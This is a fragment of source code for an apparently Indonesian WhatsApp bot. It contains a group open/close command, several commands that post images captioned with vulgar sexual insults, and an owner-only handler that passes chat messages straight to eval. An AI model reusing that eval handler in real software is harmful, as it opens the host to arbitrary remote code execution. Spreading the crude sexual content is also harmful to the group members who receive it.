if (!isGroup) return reply("dongo fitur khusus grup")
if (!isGroupAdmins) return reply("dongo fitur khusus admin")
if (!isBotGroupAdmins) return reply("dongo bot belom admin")
if (!q) return reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
if (args[0] == "close") {
hamz.groupSettingUpdate(from, 'announcement')
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
hamz.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
}
break
case 'paptt1': {
teks28 = `SANGEAN KONTOL`
hamz.sendMessage(from, { image: { url: "https://files.catbox.moe/iq8lmm.jpg" }, caption: teks28 }, { quoted: qlive })
}
break
case 'paptt2': {
teks28 = `SANGEAN KONTOL`
hamz.sendMessage(from, { image: { url: "https://files.catbox.moe/whlobn.jpg" }, caption: teks28 }, { quoted: qlive })
}
break
case 'paptt3': {
teks28 = `SNGEAN KONTOL`
hamz.sendMessage(from, { image: { url: "https://files.catbox.moe/whlobn.jpg" }, caption: teks28 }, { quoted: qlive })
}
break
case 'paptt4': {
teks28 = `SANGEAN KONTOL`
hamz.sendMessage(from, { image: { url: "https://files.catbox.moe/jp2qhx.jpg" }, caption: teks28 }, { quoted: qlive })
}
break
case 'paptt5': {
teks28 = `SANGEAN KONTL`
hamz.sendMessage(from, { image: { url: "https://files.catbox.moe/jp2qhx.jpg" }, caption: teks28 }, { quoted: qlive })
}
break
default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});